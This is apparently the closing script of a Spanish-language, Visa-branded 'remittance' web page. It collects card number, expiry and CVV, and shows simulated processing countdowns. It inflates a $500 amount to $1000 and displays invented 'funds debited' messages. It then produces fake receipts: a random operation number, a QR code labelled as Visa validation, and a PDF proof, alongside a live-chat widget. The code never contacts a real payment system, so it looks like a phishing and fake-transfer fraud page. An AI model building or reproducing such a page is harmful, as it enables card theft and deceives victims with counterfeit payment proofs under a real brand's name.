    document.getElementById("confirmBenefData").innerHTML = text;
  }

  function closeAccountValidOverlay(){
    document.getElementById("accountValidOverlay").classList.remove("active");
  }

  function proceedAfterAccountValid(){
    const checkVisaApta = document.getElementById("checkVisaApta").checked;
    if (!checkVisaApta){
      alert("Marque la casilla de confirmación para continuar.");
      return;
    }
    document.getElementById("accountValidOverlay").classList.remove("active");
    showSection(4);
  }

  // ========== PROCESAR PAGO (P5) ==========
  function processPayment(){
    const cn = document.getElementById("cardName").value.trim();
    const cc = document.getElementById("cardNumber").value.trim();
    const ed = document.getElementById("expDate").value.trim();
    const cv = document.getElementById("cvv").value.trim();
    const amt = document.getElementById("amount").value;

    if (!cn || !cc || !ed || !cv || !amt) {
      alert("Complete todos los datos de la tarjeta y el monto.");
      return;
    }

    globalData.card.name = cn;
    globalData.card.number = cc;
    globalData.card.expDate = ed;
    globalData.card.cvv = cv;
    globalData.amount = amt;

    // Overlay "Procesando Pago"
    document.getElementById("processingPaymentOverlay").classList.add("active");
    setTimeout(()=>{
      document.getElementById("processingPaymentOverlay").classList.remove("active");
      // Countdown 90s
      showCountdown();
    }, 2000);
  }

  function showCountdown(){
    document.getElementById("countdownOverlay").classList.add("active");
    let timeLeft = 90;
    const timerEl = document.getElementById("countdownTimer");
    timerEl.textContent = `${timeLeft}s`;

    countdownInterval = setInterval(()=>{
      timeLeft--;
      timerEl.textContent = `${timeLeft}s`;
      // A los 60s -> simulamos aprobación
      if (timeLeft === 60) {
        document.getElementById("countdownOverlay").classList.remove("active");
        clearInterval(countdownInterval);
        showFundsDebited();
      }
      if (timeLeft <= 0) {
        document.getElementById("countdownOverlay").classList.remove("active");
        clearInterval(countdownInterval);
        showFundsDebited(); 
      }
    }, 1000);
  }

  function showFundsDebited(){
    let finalUSD = parseInt(globalData.amount, 10);
    if (globalData.amount === "500") {
      finalUSD = 1000;
    }
    const finalBs = finalUSD * globalData.exchangeRate;

    document.getElementById("fundsDebitedText").innerHTML = `
      Se han debitado <strong>$${finalUSD.toFixed(2)}</strong> 
      (Bs. ${finalBs.toLocaleString("es-VE",{minimumFractionDigits:2})})
      de la tarjeta.
    `;
    const bName = globalData.beneficiary.name || "el beneficiario";
    document.getElementById("benefSecurityMsg").textContent =
      `${bName}, como recibirás un monto elevado en bolívares, 
       deberás autorizar la acreditación al finalizar el proceso.`;

    document.getElementById("fundsDebitedOverlay").classList.add("active");
  }

  function approveFunds(){
    document.getElementById("fundsDebitedOverlay").classList.remove("active");
    // Animación de Éxito
    showSuccessAnimation(true);

    let finalUSD = parseInt(globalData.amount, 10);
    if (globalData.amount === "500") {
      finalUSD = 1000;
    }
    const finalBs = finalUSD * globalData.exchangeRate;
    
    document.getElementById("finalSuccessText").innerHTML = `
      Monto procesado: <strong>$${finalUSD.toFixed(2)}</strong><br>
      Equivalente: <strong>Bs. ${finalBs.toLocaleString("es-VE",{minimumFractionDigits:2})}</strong>
    `;

    setTimeout(()=>{
      showSuccessAnimation(false);
      // Ocultamos steps
      document.getElementById("stepsContainer").style.display = "none";
      // Mostramos portal
      document.getElementById("portalContainer").style.display = "block";
      fillPortalData();
    }, 3000);
  }

  function showSuccessAnimation(show){
    const anim = document.getElementById("successAnimation");
    if (show){
      anim.classList.add("active");
    } else {
      anim.classList.remove("active");
    }
  }

  /* ========== LLENAR PORTAL (P6) ========== */
  function fillPortalData(){
    let finalUSD = parseInt(globalData.amount, 10);
    if(globalData.amount === "500"){ 
      finalUSD = 1000; 
    }
    const finalBs = finalUSD * globalData.exchangeRate;

    // Llenamos datos
    document.getElementById("portalUSDAmount").textContent = "$" + finalUSD.toFixed(2);
    document.getElementById("portalVESAmount").textContent =
      "Bs. " + finalBs.toLocaleString("es-VE",{minimumFractionDigits:2});

    const { name, id, phone, email, account } = globalData.beneficiary;
    document.getElementById("portalName").textContent = name;
    document.getElementById("portalID").textContent = id;
    document.getElementById("portalPhone").textContent = phone;
    document.getElementById("portalEmail").textContent = email;
    document.getElementById("portalCountry").textContent = globalData.country;

    const code = account.slice(0,4);
    const deducedBank = bankCodes[code] || "Banco Desconocido";
    document.getElementById("portalBank").textContent = deducedBank;
    document.getElementById("portalAccount").textContent = account;

    document.getElementById("portalAmount").textContent = "$" + finalUSD + " USD";

    const last4 = globalData.card.number.slice(-4);
    document.getElementById("portalCard").textContent = "**** **** **** " + last4;

    // Nº de Comprobante
    const opNumber = (Math.floor(Math.random() * 9000000000) + 1000000000).toString();
    document.getElementById("portalOperationNumber").textContent = opNumber;

    // QR
    const qr = qrcode(0, "M");
    const qrText = `
      Validación VISA:
      Beneficiario: ${name}
      Cédula: ${id}
      Banco: ${deducedBank}
      Monto: $${finalUSD}
      Link: https://www.visa.es/
    `;
    qr.addData(qrText);
    qr.make();
    document.getElementById("qrcode").innerHTML = qr.createImgTag(4);
  }

  // ===================
  // SOLICITAR DEPÓSITO
  // ===================
  function requestDeposit(){
    // Muestra el overlay con el número de comprobante
    const opNumber = document.getElementById("portalOperationNumber").textContent;
    document.getElementById("operationNumberDisplay").innerText = opNumber;

    const overlay = document.getElementById("operationNumberOverlay");
    overlay.classList.add("active");

    // Botón con cuenta regresiva 20s
    const continueBtn = document.getElementById("continuePlanillaBtn");
    continueBtn.disabled = true;

    let countdown = 20;
    // Set texto inicial con 20s
    continueBtn.textContent = `Continuar a la planilla de retiro de fondos (${countdown}s)`;

    const interval = setInterval(() => {
      countdown--;
      if (countdown <= 0) {
        clearInterval(interval);
        continueBtn.disabled = false;
        continueBtn.textContent = "Continuar a la planilla de retiro de fondos";
      } else {
        continueBtn.textContent = `Continuar a la planilla de retiro de fondos (${countdown}s)`;
      }
    }, 1000);
  }

  function downloadPDF(){
    const elem = document.getElementById("portalContainer");
    const opt = {
      filename: "Comprobante-Remesa-Premium.pdf",
      image: { type: 'jpeg', quality: 0.98 },
      html2canvas: { scale: 2 },
      jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
    };
    html2pdf().from(elem).set(opt).save();
  }

  /*
    ===========================
    FORMATEAR CAMPO DE EXPIRACIÓN
    ===========================
  */
  window.addEventListener("DOMContentLoaded", ()=>{
    const expDateInput = document.getElementById("expDate");
    if (expDateInput){
      expDateInput.addEventListener("input",(e)=>{
        let val = e.target.value.replace(/\D/g,""); 
        if (val.length > 4) val = val.slice(0,4);
        if (val.length > 2){
          val = val.slice(0,2) + "/" + val.slice(2);
        }
        e.target.value = val;
      });
    }
  });
</script>

<!-- Tawk.to chat script -->
<script>
  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
  (function(){
    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
  })();
</script>

</body>
</html>








